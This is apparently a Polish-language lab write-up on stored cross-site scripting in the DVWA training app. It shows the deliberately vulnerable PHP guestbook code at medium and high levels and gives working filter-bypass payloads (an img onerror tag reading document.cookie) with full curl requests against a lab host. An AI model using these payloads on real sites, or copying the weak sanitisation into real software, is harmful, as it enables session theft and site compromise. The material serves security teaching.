# Stored XSS
## Opis techniki
<blockquote>
Stored Cross-Site Scripting (XSS) to podatność, w której atakujący wstrzykuje złośliwy skrypt do strony internetowej, który następnie jest przechowywany na serwerze. Ten przechowywany skrypt jest serwowany użytkownikom, którzy odwiedzają zainfekowaną stronę, powodując wykonanie skryptu przez ich przeglądarki.

Oto kilka kluczowych cech i zagrożeń związanych ze Stored XSS:
* Brak odpowiedniej walidacji danych wejściowych i wyjściowych: Stored XSS występuje, gdy złośliwy skrypt jest trwale zapisany na serwerze, na przykład w bazie danych, i następnie serwowany użytkownikom. Jeśli aplikacja nie waliduje ani nie filtruje odpowiednio danych wejściowych i wyjściowych, atakujący może zainfekować serwer złośliwym skryptem.
* Trwałość ataku: W przeciwieństwie do Reflected XSS, złośliwe skrypty w Stored XSS są trwale przechowywane na serwerze. To oznacza, że atak może trwać przez dłuższy czas, nawet jeśli atakujący nie podejmuje dalszych działań, dopóki podatność nie zostanie wykryta i naprawiona.
* Zagrożenie dla szerokiej grupy użytkowników: Ze względu na trwałość ataku, Stored XSS może wpływać na dużą liczbę użytkowników. Każda osoba, która odwiedza stronę z przechowywanym złośliwym skryptem, może zostać zaatakowana. To czyni Stored XSS szczególnie niebezpiecznym dla witryn z dużym ruchem.
* Zagrożenie dla danych użytkownika i sesji: Stored XSS może prowadzić do kradzieży wrażliwych danych, takich jak ciasteczka sesji, co pozwala atakującemu przejąć sesję użytkownika. Ponadto, może być wykorzystane do przechwycenia interakcji użytkownika, wprowadzenia do systemu złośliwych skryptów, czy nawet pełnej manipulacji zawartością strony internetowej.
</blockquote>

## Zapobieganie
<blockquote>
Podobnie jak w przypadku reflected XSS, ważne jest prawidłowe kodowanie danych wyjściowych, a także sprawdzanie i czyszczenie wszelkich danych wejściowych. Przechowywane XSS może również wymagać bardziej rygorystycznych kontroli nad tym, co użytkownicy mogą przechowywać na serwerze.
</blockquote>

## DVWA labs
- [DVWA Stored XSS #2 - Medium](#dvwa-XSS-Stored-1---medium)

- [DVWA Stored XSS #3 - High](#dvwa-XSS-Stored-2---high)

<br/>

## DVWA Stored XSS #1 - Medium
Na średnim poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie parametru "mtxMessage" i "txtName"
* Filtrowanie polega na użyciu metody strip_tags() oraz htmlspecialchars()
* W przypadku parametru "txtName" nie użyto htmlspecialchars()

#### Kod źródłowy strony `PHP`
```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = str_replace( '<script>', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}
?> 
```

#### Payload
Podatny endpoint: `http://10.10.236.56/vulnerabilities/xss_s/`<br/>
URL: `http://10.10.236.56/vulnerabilities/xss_s/<img+src+onerror=alert(document.cookie)>&mtxMessage=baw_medium&btnSign=Sign+Guestbook`

#### Komenda curl - [Wzór zapytania]
```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.236.56' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 103' -H $'Origin: http://10.10.236.56' -H $'Connection: close' -H $'Referer: http://10.10.236.56/vulnerabilities/xss_s/' -H $'Upgrade-Insecure-Requests: 1' -b $'PHPSESSID=o8bg59jl012q96i1sjk4p9ieo0; security=medium' --data-binary $'txtName=%3Cimg+src+onerror%3Dalert%28document.cookie%29%3E&mtxMessage=baw_medium&btnSign=Sign+Guestbook' $'http://10.10.236.56/vulnerabilities/xss_s/'
```

#### Efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/XSS_Stored_med.png "Po wykonaniu odpowiedniego zapytania następuje X")

Do obejścia zabezpieczenia użyto tagu "<img>" i wykorzystano brak wszystkich filtrów w przypadku parametru txtName. Po wykonaniu odpowiedniego zapytania na stronie ukazuje się szkodliwy komentarz, dzięki któremu przeglądarka użytkowników wchodzących na podatną stronę wykona zamieszczony w "Name" komentarza kod.

<br/>
<br/>

## DVWA Stored XSS #2 - High
Na trudnym poziomie trudności musimy mieć na uwadze następujące cechy laboratorium:
* Filtrowanie parametru "mtxMessage" z użyciem strip_tags() oraz htmlspecialchars()
* Filtrowanie parametru "txtName", aby usunąć możliwość użycia tagu "script"

#### Kod źródłowy strony `PHP`
```php
<?php
if( isset( $_POST[ 'btnSign' ] ) ) {
    // Get input
    $message = trim( $_POST[ 'mtxMessage' ] );
    $name    = trim( $_POST[ 'txtName' ] );

    // Sanitize message input
    $message = strip_tags( addslashes( $message ) );
    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
    $message = htmlspecialchars( $message );

    // Sanitize name input
    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));

    // Update database
    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    //mysql_close();
}
?> 
```

#### Payload
Podatny endpoint: `http://10.10.236.56/vulnerabilities/xss_s/`<br/>
URL: `http://10.10.236.56/vulnerabilities/xss_s/<img+src+onerror=alert(document.cookie)>&mtxMessage=baw_high&btnSign=Sign+Guestbook`

#### Komenda curl - [Wzór zapytania]

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.236.56' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 101' -H $'Origin: http://10.10.236.56' -H $'Connection: close' -H $'Referer: http://10.10.236.56/vulnerabilities/xss_s/' -H $'Upgrade-Insecure-Requests: 1' -b $'PHPSESSID=o8bg59jl012q96i1sjk4p9ieo0; security=high' --data-binary $'txtName=%3Cimg+src+onerror%3Dalert%28document.cookie%29%3E&mtxMessage=baw_high&btnSign=Sign+Guestbook'  $'http://10.10.236.56/vulnerabilities/xss_s/'

```

#### Efekt działania:
![alt text](https://github.com/249064/CBE-BAW-2023/raw/main/res/XSS_Stored_hard.png "Po wykonaniu odpowiedniego zapytania następuje X")

<br/>

Do obejścia zabezpieczenia użyto tagu `<img>`. Po wykonaniu odpowiedniego zapytania na stronie ukazuje się szkodliwy komentarz, dzięki któremu przeglądarka użytkowników wchodzących na podatną stronę wykona zamieszczony w "Name" komentarza kod.
